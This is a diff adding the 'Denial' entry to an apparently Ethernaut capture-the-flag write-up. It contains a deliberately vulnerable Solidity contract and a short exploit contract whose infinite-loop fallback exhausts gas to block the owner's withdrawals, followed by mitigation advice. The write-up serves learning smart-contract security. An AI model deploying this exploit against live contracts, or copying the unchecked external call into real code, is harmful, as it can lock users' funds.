@@ -18,7 +18,7 @@
 17. [Recovery](#17-recovery)
 18. [MagicNumber](yet to update)
 19. ~[Alien Codex]~
-20. [Denial](yet to update)
+20. [Denial](#20-denial)
 21. [Shop](#21-shop)
 22. [Dex](yet to update)
 23. [Dex Two](yet to update)
@@ -1008,21 +1008,70 @@ If you're going to implement this technique, make sure you don't miss the nonce 
 
 # 20. Denial
 ### Challenge
-- 
+- Deny the owner from withdrawing funds when they call to withdraw()
 ### Purpose
-
+External call manipulation.
 ### Contract
 ```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Denial {
 
+    address public partner; // withdrawal partner - pay the gas, split the withdraw
+    address public constant owner = address(0xA9E);
+    uint timeLastWithdrawn;
+    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances
+
+    function setWithdrawPartner(address _partner) public {
+        partner = _partner;
+    }
+
+    // withdraw 1% to recipient and 1% to owner
+    function withdraw() public {
+        uint amountToSend = address(this).balance / 100;
+        // perform a call without checking return
+        // The recipient can revert, the owner will still get their share
+        partner.call{value:amountToSend}("");
+        payable(owner).transfer(amountToSend);
+        // keep track of last withdrawal time
+        timeLastWithdrawn = block.timestamp;
+        withdrawPartnerBalances[partner] +=  amountToSend;
+    }
+
+    // allow deposit of funds
+    receive() external payable {}
+
+    // convenience function
+    function contractBalance() public view returns (uint) {
+        return address(this).balance;
+    }
+}
 ```
 ### Solution
 ##### Explanation
-
+This is similar to [King](#9-king) challenge. The caveat is we create DOS just by reverting while receiving value. Because `Denial` does not use `transfer` to send ether and the return value for the external call is not checked. So reverting will only fail to receive ether, but further execution will perform as usual. Another way to make it deniable is to spend all the gas since `call` transfers all remaining gas left. We can do it with a simple infinit loop.
 ##### Exploit
 ```
+contract HackDenial {
 
+    fallback() external payable {
+        while(true){}
+    }
+
+    function attack(Denial target) external {
+        target.setWithdrawPartner(address(this));
+    }
+}
 ```
+1. Deploy the above contract.
+2. Call `attack()` to set this as a partner.\
+Now, any further call to `withdraw` will throw an OOG exception.
 ##### Takeaway from Ethernaut
+This level demonstrates that external calls to unknown contracts can still create denial of service attack vectors if a fixed amount of gas is not specified.\
+If you are using a low level `call` to continue executing in the event an external call reverts, ensure that you specify a fixed gas stipend.\
+Typically one should follow the [checks-effects-interactions](http://solidity.readthedocs.io/en/latest/security-considerations.html#use-the-checks-effects-interactions-pattern) pattern to avoid reentrancy attacks, there can be other circumstances (such as multiple external calls at the end of a function) where issues such as this can arise.\
+\
+**Note:** An external CALL can use at most 63/64 of the gas currently available at the time of the CALL. Thus, depending on how much gas is required to complete a transaction, a transaction of sufficiently high gas (i.e. one such that 1/64 of the gas is capable of completing the remaining opcodes in the parent call) can be used to mitigate this particular attack.
 
 # 21. Shop
 ### Challenge
